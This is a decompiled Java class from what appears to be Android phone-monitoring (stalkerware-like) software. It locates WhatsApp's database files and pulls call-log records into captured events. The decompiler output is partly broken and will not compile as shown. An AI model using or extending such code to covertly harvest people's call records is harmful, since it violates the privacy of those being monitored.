package com.vvt.capture.wa.voip.calllog.full;

import android.os.SystemClock;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.wa.voip.calllog.b;
import java.io.File;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class WhatsAppCallLogQuery
  implements f
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.d;
  private static final boolean d = com.vvt.ak.a.e;
  private long e = -1;
  private WhatsAppCallLogQuery.DatabaseStructure f;
  private boolean g = false;
  
  public WhatsAppCallLogQuery()
  {
    WhatsAppCallLogQuery.DatabaseStructure localDatabaseStructure = WhatsAppCallLogQuery.DatabaseStructure.UNKNOWN;
    this.f = localDatabaseStructure;
  }
  
  private boolean b()
  {
    boolean bool1 = false;
    String[] arrayOfString = com.vvt.capture.wa.b.a.a();
    int i = arrayOfString.length;
    int j = 0;
    for (;;)
    {
      if (j < i)
      {
        String str = arrayOfString[j];
        File localFile = new java/io/File;
        localFile.<init>(str);
        boolean bool2 = localFile.exists();
        if (bool2) {
          bool1 = true;
        }
      }
      else
      {
        return bool1;
      }
      j += 1;
    }
  }
  
  public g a()
  {
    long l1 = -1;
    boolean bool1 = a;
    if (bool1) {}
    FxSimpleEventReference localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
    localFxSimpleEventReference.<init>();
    boolean bool2;
    try
    {
      bool1 = b();
      if (bool1)
      {
        long l2 = b.a();
        bool1 = false;
        Object localObject = null;
        l3 = l2;
        int j = 0;
        for (;;)
        {
          boolean bool3 = l3 < l1;
          if (bool3) {
            break;
          }
          int k = 10;
          if (j >= k) {
            break;
          }
          l3 = 6000L;
          SystemClock.sleep(l3);
          long l4 = b.a();
          int i = j + 1;
          j = i;
          l3 = l4;
        }
      }
      boolean bool4;
      bool2 = c;
    }
    catch (Exception localException)
    {
      bool2 = d;
      if (bool2) {}
      l3 = l1;
      bool4 = l3 < l1;
      if (bool4) {
        break label162;
      }
    }
    if (bool2) {}
    long l3 = this.e;
    for (;;)
    {
      Long localLong = Long.valueOf(l3);
      localFxSimpleEventReference.setReference(localLong);
      bool2 = a;
      if (bool2) {}
      return localFxSimpleEventReference;
      label162:
      this.e = l3;
    }
  }
  
  public List a(int paramInt)
  {
    bool1 = a;
    if (bool1) {}
    ArrayList localArrayList1 = new java/util/ArrayList;
    localArrayList1.<init>();
    for (;;)
    {
      try
      {
        bool1 = b();
        if (bool1)
        {
          long l1 = b.a();
          long l2 = 0L;
          boolean bool2 = a;
          if (bool2) {}
          localDatabaseStructure = this.f;
          Object localObject = WhatsAppCallLogQuery.DatabaseStructure.UNKNOWN;
          if (localDatabaseStructure == localObject)
          {
            bool2 = b.b();
            this.g = bool2;
            bool2 = this.g;
            if (!bool2) {
              continue;
            }
            localDatabaseStructure = WhatsAppCallLogQuery.DatabaseStructure.OLD_DESIGN;
            this.f = localDatabaseStructure;
          }
          bool2 = b;
          if (bool2) {}
          bool2 = this.g;
          localObject = Integer.toString(paramInt);
          ArrayList localArrayList2 = b.a(l2, l1, bool2, (String)localObject);
          localArrayList1.addAll(localArrayList2);
        }
      }
      catch (Exception localException)
      {
        WhatsAppCallLogQuery.DatabaseStructure localDatabaseStructure;
        bool1 = d;
        if (!bool1) {
          continue;
        }
        continue;
      }
      bool1 = a;
      if (bool1) {}
      return localArrayList1;
      localDatabaseStructure = WhatsAppCallLogQuery.DatabaseStructure.NEW_DESIGN;
    }
  }
  
  public List a(g paramg1, g paramg2)
  {
    bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    for (;;)
    {
      try
      {
        localObject = paramg1.getReference();
        localObject = (Long)localObject;
        long l1 = ((Long)localObject).longValue();
        localObject = paramg2.getReference();
        localObject = (Long)localObject;
        long l2 = ((Long)localObject).longValue();
        localObject = this.f;
        WhatsAppCallLogQuery.DatabaseStructure localDatabaseStructure = WhatsAppCallLogQuery.DatabaseStructure.UNKNOWN;
        if (localObject == localDatabaseStructure)
        {
          bool = b.b();
          this.g = bool;
          bool = this.g;
          if (!bool) {
            continue;
          }
          localObject = WhatsAppCallLogQuery.DatabaseStructure.OLD_DESIGN;
          this.f = ((WhatsAppCallLogQuery.DatabaseStructure)localObject);
        }
        bool = b;
        if (bool) {}
        bool = this.g;
        localObject = b.a(l1, l2, bool);
        localArrayList.addAll((Collection)localObject);
      }
      catch (Exception localException)
      {
        Object localObject;
        bool = d;
        if (!bool) {
          continue;
        }
        continue;
      }
      bool = a;
      if (bool) {}
      return localArrayList;
      localObject = WhatsAppCallLogQuery.DatabaseStructure.NEW_DESIGN;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/wa/voip/calllog/full/WhatsAppCallLogQuery.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */